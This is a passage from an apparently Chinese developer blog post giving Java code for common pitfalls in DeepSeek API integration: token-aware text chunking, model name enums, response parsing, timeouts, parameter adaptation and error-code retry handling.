    <span class="hljs-comment">// 单轮最大Token数8192，留2000给模型回复，所以请求最多6192个Token</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MAX_REQUEST_TOKENS</span> <span class="hljs-operator">=</span> <span class="hljs-number">8192</span> - <span class="hljs-number">2000</span>;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ThreadSafeDeepSeekClient</span> <span class="hljs-variable">deepSeekClient</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadSafeDeepSeekClient</span>();

    <span class="hljs-comment">// 算文本的Token数，比按字数准多了</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">countTokens</span><span class="hljs-params">(String text)</span> {
        <span class="hljs-keyword">return</span> encoding.countTokens(text);
    }

    <span class="hljs-comment">// 超长文本分块，尽量不切句子</span>
    <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">splitLongText</span><span class="hljs-params">(String longText)</span> {
        List&lt;String&gt; chunks = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-type">int</span> <span class="hljs-variable">totalTokens</span> <span class="hljs-operator">=</span> countTokens(longText);

        <span class="hljs-comment">// 没超限制就直接返回</span>
        <span class="hljs-keyword">if</span> (totalTokens &lt;= MAX_REQUEST_TOKENS) {
            chunks.add(longText);
            <span class="hljs-keyword">return</span> chunks;
        }

        <span class="hljs-comment">// 按中文和英文的句号分割句子，保持意思完整</span>
        String[] sentences = longText.split(<span class="hljs-string">"(?&lt;=[。！？.?!])"</span>);
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">currentChunk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        <span class="hljs-type">int</span> <span class="hljs-variable">currentTokens</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

        <span class="hljs-keyword">for</span> (String sentence : sentences) {
            <span class="hljs-type">int</span> <span class="hljs-variable">sentenceTokens</span> <span class="hljs-operator">=</span> countTokens(sentence);
            <span class="hljs-comment">// 极端情况：一个句子就超了，那就按Token硬切</span>
            <span class="hljs-keyword">if</span> (sentenceTokens &gt; MAX_REQUEST_TOKENS) {
                chunks.addAll(splitOverLengthSentence(sentence, MAX_REQUEST_TOKENS));
                <span class="hljs-keyword">continue</span>;
            }
            <span class="hljs-comment">// 加当前句子会超的话，先把之前的存起来</span>
            <span class="hljs-keyword">if</span> (currentTokens + sentenceTokens &gt; MAX_REQUEST_TOKENS) {
                chunks.add(currentChunk.toString().trim());
                currentChunk = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
                currentTokens = <span class="hljs-number">0</span>;
            }
            currentChunk.append(sentence);
            currentTokens += sentenceTokens;
        }

        <span class="hljs-comment">// 把最后一块加进去</span>
        <span class="hljs-keyword">if</span> (currentChunk.length() &gt; <span class="hljs-number">0</span>) {
            chunks.add(currentChunk.toString().trim());
        }

        <span class="hljs-keyword">return</span> chunks;
    }

    <span class="hljs-comment">// 单个句子超Token限制，按Token硬切</span>
    <span class="hljs-keyword">private</span> List&lt;String&gt; <span class="hljs-title function_">splitOverLengthSentence</span><span class="hljs-params">(String sentence, <span class="hljs-type">int</span> maxTokens)</span> {
        List&lt;String&gt; subChunks = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        <span class="hljs-type">char</span>[] chars = sentence.toCharArray();
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">subChunk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        <span class="hljs-type">int</span> <span class="hljs-variable">currentTokens</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c : chars) {
            <span class="hljs-type">String</span> <span class="hljs-variable">charStr</span> <span class="hljs-operator">=</span> String.valueOf(c);
            <span class="hljs-type">int</span> <span class="hljs-variable">charTokens</span> <span class="hljs-operator">=</span> countTokens(charStr);
            <span class="hljs-keyword">if</span> (currentTokens + charTokens &gt; maxTokens) {
                subChunks.add(subChunk.toString().trim());
                subChunk = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
                currentTokens = <span class="hljs-number">0</span>;
            }
            subChunk.append(c);
            currentTokens += charTokens;
        }

        <span class="hljs-keyword">if</span> (subChunk.length() &gt; <span class="hljs-number">0</span>) {
            subChunks.add(subChunk.toString().trim());
        }
        <span class="hljs-keyword">return</span> subChunks;
    }

    <span class="hljs-comment">// 分块调用API，最后拼结果</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">processLongText</span><span class="hljs-params">(String longText)</span> {
        List&lt;String&gt; chunks = splitLongText(longText);
        <span class="hljs-comment">// 就一块的话直接调</span>
        <span class="hljs-keyword">if</span> (chunks.size() == <span class="hljs-number">1</span>) {
            <span class="hljs-keyword">return</span> deepSeekClient.asyncCall(chunks.get(<span class="hljs-number">0</span>)).join();
        }

        <span class="hljs-comment">// 多块的话异步调用，效率高</span>
        List&lt;CompletableFuture&lt;String&gt;&gt; futures = chunks.stream()
                .map(chunk -&gt; {
                    <span class="hljs-comment">// 告诉模型这是第几块，总共多少块，让它有上下文</span>
                    <span class="hljs-type">String</span> <span class="hljs-variable">prompt</span> <span class="hljs-operator">=</span> <span class="hljs-string">"请处理以下文本片段（一共"</span> + chunks.size() + <span class="hljs-string">"段，这是第"</span> + (chunks.indexOf(chunk) + <span class="hljs-number">1</span>) + <span class="hljs-string">"段）：\n"</span> + chunk;
                    <span class="hljs-keyword">return</span> deepSeekClient.asyncCall(prompt);
                })
                .collect(Collectors.toList());

        <span class="hljs-comment">// 等所有调用都完成</span>
        CompletableFuture&lt;Void&gt; allDone = CompletableFuture.allOf(futures.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CompletableFuture</span>[<span class="hljs-number">0</span>]));
        allDone.join();

        <span class="hljs-comment">// 拼结果</span>
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">finalResult</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        finalResult.append(<span class="hljs-string">"超长文本处理结果（按片段拼接）：\n"</span>);
        <span class="hljs-keyword">for</span> (CompletableFuture&lt;String&gt; future : futures) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">String</span> <span class="hljs-variable">chunkRes</span> <span class="hljs-operator">=</span> future.get();
                <span class="hljs-comment">// 提取回复内容，实际项目里用FastJSON或者Jackson解析更靠谱</span>
                <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> extractContent(chunkRes);
                finalResult.append(content).append(<span class="hljs-string">"\n"</span>);
            } <span class="hljs-keyword">catch</span> (Exception e) {
                finalResult.append(<span class="hljs-string">"【这段处理失败】："</span>).append(e.getMessage()).append(<span class="hljs-string">"\n"</span>);
            }
        }

        <span class="hljs-keyword">return</span> finalResult.toString();
    }

    <span class="hljs-comment">// 从API响应里把回复内容抠出来（简化版，实际用JSON库）</span>
    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">extractContent</span><span class="hljs-params">(String response)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">contentStart</span> <span class="hljs-operator">=</span> response.indexOf(<span class="hljs-string">"\"content\":\""</span>) + <span class="hljs-number">10</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">contentEnd</span> <span class="hljs-operator">=</span> response.indexOf(<span class="hljs-string">"\"}"</span>, contentStart);
        <span class="hljs-keyword">if</span> (contentStart &gt; <span class="hljs-number">0</span> &amp;&amp; contentEnd &gt; contentStart) {
            <span class="hljs-keyword">return</span> response.substring(contentStart, contentEnd);
        }
        <span class="hljs-keyword">return</span> response;
    }
}
</code></pre>
<h3 data-id="heading-18">关键优化点说明</h3>
<ol>
<li><strong>精准Token计算</strong>：使用 jtokkit 库（适配 OpenAI/DeepSeek 的 Token 编码规则），准确计算文本 Token 数，避免按字符数分割导致的误差；</li>
<li><strong>语义化分块</strong>：优先按句子分割，保留文本语义完整性，避免截断导致的上下文丢失；</li>
<li><strong>极端情况处理</strong>：单个句子超出 Token 限制时，按 Token 数切割，保证分块后能正常调用 API；</li>
<li><strong>异步分块调用</strong>：多块文本异步调用 API，提高处理效率，最后拼接结果；</li>
<li><strong>上下文标识</strong>：给每个分块添加段数标识，让模型理解当前处理的是超长文本的一部分，提升回复质量。</li>
</ol>
<h2 data-id="heading-19">四、坑 4：模型名称配置错误</h2>
<h3 data-id="heading-20">问题本质</h3>
<p>不同模型的名称规范不同（如 ChatGPT 是 <code>gpt-3.5-turbo</code>，文心一言是 <code>ernie-bot</code>），若将其他模型的名称直接套用在 DeepSeek 上，会返回 404 错误（模型不存在）。</p>
<h3 data-id="heading-21">解决方案</h3>
<p>搞个枚举类存DeepSeek的模型名：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// DeepSeek模型名枚举，直接拿过来用</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeepSeekModelEnum</span> {
    <span class="hljs-comment">// 通用对话、代码生成、推理增强，常用的就这三个</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEEPSEEK_CHAT</span> <span class="hljs-operator">=</span> <span class="hljs-string">"deepseek-chat"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEEPSEEK_CODER</span> <span class="hljs-operator">=</span> <span class="hljs-string">"deepseek-coder"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEEPSEEK_R1</span> <span class="hljs-operator">=</span> <span class="hljs-string">"deepseek-r1"</span>;

    <span class="hljs-comment">// 如果你之前用别的模型，用这个方法转成DeepSeek的</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">convertFromOtherModel</span><span class="hljs-params">(String otherModelName)</span> {
        <span class="hljs-keyword">switch</span> (otherModelName.toLowerCase()) {
            <span class="hljs-comment">// 之前用GPT-3.5或文心一言的对话场景，转成deepseek-chat</span>
            <span class="hljs-keyword">case</span> <span class="hljs-string">"gpt-3.5-turbo"</span>:
            <span class="hljs-keyword">case</span> <span class="hljs-string">"ernie-bot"</span>:
                <span class="hljs-keyword">return</span> DEEPSEEK_CHAT;
            <span class="hljs-comment">// 之前用代码模型的，转成deepseek-coder</span>
            <span class="hljs-keyword">case</span> <span class="hljs-string">"code-davinci-002"</span>:
                <span class="hljs-keyword">return</span> DEEPSEEK_CODER;
            <span class="hljs-comment">// 其他情况默认用通用对话模型</span>
            <span class="hljs-keyword">default</span>:
                <span class="hljs-keyword">return</span> DEEPSEEK_CHAT;
        }
    }
}

<span class="hljs-comment">// 调用示例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ModelClient</span> {
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">callWithRightModel</span><span class="hljs-params">(String prompt)</span> {
        Map&lt;String, Object&gt; requestBody = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        <span class="hljs-comment">// 直接用枚举里的模型名，肯定不会错</span>
        requestBody.put(<span class="hljs-string">"model"</span>, DeepSeekModelEnum.DEEPSEEK_CHAT);
        <span class="hljs-comment">// 其他参数...</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;
    }
}
</code></pre>
<h2 data-id="heading-22">五、坑 5：响应参数解析错误</h2>
<h3 data-id="heading-23">问题本质</h3>
<p>虽然DeepSeek响应格式和OpenAI像，但有些字段不一样，比如<code>finish_reason</code>的取值、<code>usage</code>里的统计方式。有人直接抄ChatGPT的解析代码，结果要么字段拿不到，要么报解析异常。</p>
<h3 data-id="heading-24">解决方案</h3>
<p>搞个专门的解析工具，兼容这些差异：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;
<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;

<span class="hljs-comment">// DeepSeek响应解析工具类（适配字段差异）</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeepSeekResponseParser</span> {
    <span class="hljs-comment">// 提取回复内容</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getContent</span><span class="hljs-params">(String responseJson)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">JSONObject</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> JSON.parseObject(responseJson);
            <span class="hljs-comment">// 兼容DeepSeek和OpenAI的响应结构</span>
            <span class="hljs-keyword">if</span> (root.containsKey(<span class="hljs-string">"choices"</span>) &amp;&amp; !root.getJSONArray(<span class="hljs-string">"choices"</span>).isEmpty()) {
                <span class="hljs-type">JSONObject</span> <span class="hljs-variable">choice</span> <span class="hljs-operator">=</span> root.getJSONArray(<span class="hljs-string">"choices"</span>).getJSONObject(<span class="hljs-number">0</span>);
                <span class="hljs-comment">// DeepSeek的message字段与OpenAI一致，但需判空</span>
                <span class="hljs-keyword">if</span> (choice.containsKey(<span class="hljs-string">"message"</span>)) {
                    <span class="hljs-keyword">return</span> choice.getJSONObject(<span class="hljs-string">"message"</span>).getString(<span class="hljs-string">"content"</span>);
                }
            }
            <span class="hljs-comment">// 要是有error字段，直接抛异常</span>
            <span class="hljs-keyword">if</span> (root.containsKey(<span class="hljs-string">"error"</span>)) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"API报错："</span> + root.getJSONObject(<span class="hljs-string">"error"</span>).getString(<span class="hljs-string">"message"</span>));
            }
            <span class="hljs-keyword">return</span> <span class="hljs-string">"没拿到有效回复"</span>;
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"解析响应失败："</span> + e.getMessage());
        }
    }

    <span class="hljs-comment">// 解析Token使用量（适配DeepSeek的usage字段）</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getUsedTokens</span><span class="hljs-params">(String responseJson)</span> {
        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> JSON.parseObject(responseJson);
        <span class="hljs-keyword">if</span> (root.containsKey(<span class="hljs-string">"usage"</span>)) {
            <span class="hljs-keyword">return</span> root.getJSONObject(<span class="hljs-string">"usage"</span>).getIntValue(<span class="hljs-string">"total_tokens"</span>);
        }
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
}

<span class="hljs-comment">// 调用示例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ParserClient</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">parseResponse</span><span class="hljs-params">(String response)</span> {
        <span class="hljs-comment">// 直接拿回复内容，不用自己处理JSON</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> DeepSeekResponseParser.getContent(response);
        <span class="hljs-comment">// 看看用了多少Token</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">usedTokens</span> <span class="hljs-operator">=</span> DeepSeekResponseParser.getUsedTokens(response);
        System.out.println(<span class="hljs-string">"回复："</span> + content);
        System.out.println(<span class="hljs-string">"消耗Token："</span> + usedTokens);
    }
}
</code></pre>
<h2 data-id="heading-25">六、坑 6：超时配置不匹配</h2>
<h3 data-id="heading-26">问题本质</h3>
<p>DeepSeek API 的响应速度与模型类型、文本长度相关（如 deepseek-coder 处理代码时响应较慢），若直接复用 ChatGPT 的超时配置（如 10 秒），会导致频繁超时；反之，超时配置过长会导致线程阻塞。</p>
<h3 data-id="heading-27">解决方案</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 动态超时配置工具</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TimeoutConfig</span> {
    <span class="hljs-comment">// 不同模型的基础超时时间（毫秒）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CHAT_TIMEOUT</span> <span class="hljs-operator">=</span> <span class="hljs-number">30000</span>; <span class="hljs-comment">// 对话模型30秒</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CODER_TIMEOUT</span> <span class="hljs-operator">=</span> <span class="hljs-number">60000</span>; <span class="hljs-comment">// 代码模型60秒</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">R1_TIMEOUT</span> <span class="hljs-operator">=</span> <span class="hljs-number">45000</span>; <span class="hljs-comment">// 推理模型45秒</span>

    <span class="hljs-comment">// 按模型拿基础超时</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getBaseTimeout</span><span class="hljs-params">(String modelName)</span> {
        <span class="hljs-keyword">switch</span> (modelName) {
            <span class="hljs-keyword">case</span> DeepSeekModelEnum.DEEPSEEK_CODER:
                <span class="hljs-keyword">return</span> CODER_TIMEOUT;
            <span class="hljs-keyword">case</span> DeepSeekModelEnum.DEEPSEEK_R1:
                <span class="hljs-keyword">return</span> R1_TIMEOUT;
            <span class="hljs-keyword">default</span>:
                <span class="hljs-keyword">return</span> CHAT_TIMEOUT;
        }
    }

    <span class="hljs-comment">// 按文本长度加超时，长文本给更多时间</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getDynamicTimeout</span><span class="hljs-params">(String modelName, String text)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">baseTimeout</span> <span class="hljs-operator">=</span> getBaseTimeout(modelName);
        <span class="hljs-type">int</span> <span class="hljs-variable">textLen</span> <span class="hljs-operator">=</span> text.length();
        <span class="hljs-comment">// 每1000字加5秒，最多不超过基础超时的2倍（别无限加）</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">extraTimeout</span> <span class="hljs-operator">=</span> Math.min((textLen / <span class="hljs-number">1000</span>) * <span class="hljs-number">5000</span>, baseTimeout);
        <span class="hljs-keyword">return</span> baseTimeout + extraTimeout;
    }
}

<span class="hljs-comment">// 调用示例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TimeoutClient</span> {
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">callWithDynamicTimeout</span><span class="hljs-params">(String prompt)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">model</span> <span class="hljs-operator">=</span> DeepSeekModelEnum.DEEPSEEK_CODER;
        <span class="hljs-comment">// 按模型和文本长度算超时</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">timeout</span> <span class="hljs-operator">=</span> TimeoutConfig.getDynamicTimeout(model, prompt);

        Map&lt;String, Object&gt; requestBody = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        requestBody.put(<span class="hljs-string">"model"</span>, model);
        requestBody.put(<span class="hljs-string">"messages"</span>, Collections.singletonList(Map.of(<span class="hljs-string">"role"</span>, <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>, prompt)));
        requestBody.put(<span class="hljs-string">"timeout"</span>, timeout); <span class="hljs-comment">// 把算好的超时传进去</span>

        <span class="hljs-comment">// 其他请求逻辑...</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;
    }
}
</code></pre>
<h2 data-id="heading-28">七、坑 7：请求参数不兼容</h2>
<h3 data-id="heading-29">问题本质</h3>
<p>有些参数在别的模型里有用，但DeepSeek不支持，比如ChatGPT的<code>frequency_penalty</code>（重复惩罚），传了DeepSeek也不理；还有<code>temperature</code>（随机性），ChatGPT支持0-2，DeepSeek只支持0-1，传1.5过去就会被强制调整。</p>
<h3 data-id="heading-30">解决方案</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.List;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-comment">// 请求参数适配工具</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ParamsAdapter</span> {
    <span class="hljs-comment">// DeepSeek不支持的参数列表</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;String&gt; UNSUPPORTED_PARAMS = List.of(
            <span class="hljs-string">"frequency_penalty"</span>, <span class="hljs-string">"presence_penalty"</span>, <span class="hljs-string">"logit_bias"</span>
    );

    <span class="hljs-comment">// 适配参数，保证传过去的都能用</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map&lt;String, Object&gt; <span class="hljs-title function_">adapt</span><span class="hljs-params">(Map&lt;String, Object&gt; originalParams)</span> {
        Map&lt;String, Object&gt; adaptedParams = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(originalParams);

        <span class="hljs-comment">// 1. 把不支持的参数删掉</span>
        UNSUPPORTED_PARAMS.forEach(adaptedParams::remove);

        <span class="hljs-comment">// 2. 修正temperature：只能0-1</span>
        <span class="hljs-keyword">if</span> (adaptedParams.containsKey(<span class="hljs-string">"temperature"</span>)) {
            <span class="hljs-type">double</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> (<span class="hljs-type">double</span>) adaptedParams.get(<span class="hljs-string">"temperature"</span>);
            <span class="hljs-comment">// 小于0取0，大于1取1，中间的不变</span>
            adaptedParams.put(<span class="hljs-string">"temperature"</span>, Math.min(Math.max(temp, <span class="hljs-number">0.0</span>), <span class="hljs-number">1.0</span>));
        }

        <span class="hljs-comment">// 3. 修正max_tokens：最少10，最多4096</span>
        <span class="hljs-keyword">if</span> (adaptedParams.containsKey(<span class="hljs-string">"max_tokens"</span>)) {
            <span class="hljs-type">int</span> <span class="hljs-variable">maxTokens</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) adaptedParams.get(<span class="hljs-string">"max_tokens"</span>);
            adaptedParams.put(<span class="hljs-string">"max_tokens"</span>, Math.min(Math.max(maxTokens, <span class="hljs-number">10</span>), <span class="hljs-number">4096</span>));
        }

        <span class="hljs-keyword">return</span> adaptedParams;
    }
}

<span class="hljs-comment">// 调用示例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ParamsClient</span> {
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">callWithRightParams</span><span class="hljs-params">(String prompt)</span> {
        <span class="hljs-comment">// 原来的参数，可能有无效的</span>
        Map&lt;String, Object&gt; originalParams = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        originalParams.put(<span class="hljs-string">"model"</span>, DeepSeekModelEnum.DEEPSEEK_CHAT);
        originalParams.put(<span class="hljs-string">"temperature"</span>, <span class="hljs-number">1.5</span>); <span class="hljs-comment">// 超出DeepSeek的范围</span>
        originalParams.put(<span class="hljs-string">"frequency_penalty"</span>, <span class="hljs-number">0.5</span>); <span class="hljs-comment">// DeepSeek不支持</span>
        originalParams.put(<span class="hljs-string">"messages"</span>, Collections.singletonList(Map.of(<span class="hljs-string">"role"</span>, <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>, prompt)));

        <span class="hljs-comment">// 适配后再传</span>
        Map&lt;String, Object&gt; adaptedParams = ParamsAdapter.adapt(originalParams);
        <span class="hljs-comment">// 其他请求逻辑...</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;
    }
}
</code></pre>
<h2 data-id="heading-31">八、坑 8：错误码处理不兼容</h2>
<h3 data-id="heading-32">问题本质</h3>
<p>同样是429错误，DeepSeek表示“请求太频繁，触发限流了”，但文心一言可能表示“Token用完了”；还有500错误，有人以为是自己代码的问题，其实是DeepSeek服务端的问题，白查半天。</p>
<h3 data-id="heading-33">解决方案</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.web.client.HttpClientErrorException;

<span class="hljs-comment">// 错误码适配工具类</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeepSeekErrorHandler</span> {
    <span class="hljs-comment">// DeepSeek常见错误码说明</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">ErrorCode</span> {
        TOKEN_EXPIRED(<span class="hljs-number">401</span>, <span class="hljs-string">"Token过期或无效，该刷新了"</span>),
        RATE_LIMIT(<span class="hljs-number">429</span>, <span class="hljs-string">"请求太频繁，歇会儿再试"</span>),
        TOO_LONG(<span class="hljs-number">400</span>, <span class="hljs-string">"文本太长，超过Token限制了"</span>),
        MODEL_NOT_FOUND(<span class="hljs-number">404</span>, <span class="hljs-string">"模型名填错了"</span>),
        SERVER_ERROR(<span class="hljs-number">500</span>, <span class="hljs-string">"DeepSeek服务端出问题了"</span>);

        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> code;
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String desc;

        ErrorCode(<span class="hljs-type">int</span> code, String desc) {
            <span class="hljs-built_in">this</span>.code = code;
            <span class="hljs-built_in">this</span>.desc = desc;
        }

        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getCode</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> code;
        }

        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDesc</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> desc;
        }
    }

    <span class="hljs-comment">// 处理DeepSeek错误，返回适配的重试策略</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">needRetry</span><span class="hljs-params">(Exception e)</span> {
        <span class="hljs-keyword">if</span> (e <span class="hljs-keyword">instanceof</span> HttpClientErrorException) {
            <span class="hljs-type">int</span> <span class="hljs-variable">statusCode</span> <span class="hljs-operator">=</span> ((HttpClientErrorException) e).getStatusCode().value();
            <span class="hljs-comment">// 限流和服务端错误可以重试，其他的别瞎试</span>
            <span class="hljs-keyword">return</span> statusCode == ErrorCode.RATE_LIMIT.getCode()
                    || statusCode == ErrorCode.SERVER_ERROR.getCode();
        }
        <span class="hljs-comment">// 网络超时、连接失败这些也可以重试</span>
        <span class="hljs-keyword">return</span> e <span class="hljs-keyword">instanceof</span> java.net.SocketTimeoutException
                || e <span class="hljs-keyword">instanceof</span> java.net.ConnectException;
    }

    <span class="hljs-comment">// 获取错误描述，适配不同模型的错误码</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getErrorMsg</span><span class="hljs-params">(Exception e)</span> {
        <span class="hljs-keyword">if</span> (e <span class="hljs-keyword">instanceof</span> HttpClientErrorException) {
            <span class="hljs-type">HttpClientErrorException</span> <span class="hljs-variable">ex</span> <span class="hljs-operator">=</span> (HttpClientErrorException) e;
            <span class="hljs-type">int</span> <span class="hljs-variable">statusCode</span> <span class="hljs-operator">=</span> ex.getStatusCode().value();
            <span class="hljs-comment">// 匹配错误码</span>
            <span class="hljs-keyword">for</span> (ErrorCode errorCode : ErrorCode.values()) {
                <span class="hljs-keyword">if</span> (errorCode.getCode() == statusCode) {
                    <span class="hljs-keyword">return</span> errorCode.getDesc() + <span class="hljs-string">"，详情："</span> + ex.getResponseBodyAsString();
                }
            }
        }
        <span class="hljs-comment">// 其他错误直接返回信息</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"未知错误："</span> + e.getMessage();
    }
}

<span class="hljs-comment">// 调用示例，带重试逻辑</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RetryClient</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MAX_RETRY</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>; <span class="hljs-comment">// 最多重试3次</span>

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">callWithRetry</span><span class="hljs-params">(String prompt)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">retryCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        <span class="hljs-keyword">while</span> (retryCount &lt; MAX_RETRY) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// 调用API的逻辑</span>
                <span class="hljs-type">DeepSeekApiClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeepSeekApiClient</span>();
                <span class="hljs-keyword">return</span> client.callDeepSeek(prompt);
            } <span class="hljs-keyword">catch</span> (Exception e) {
                retryCount++;
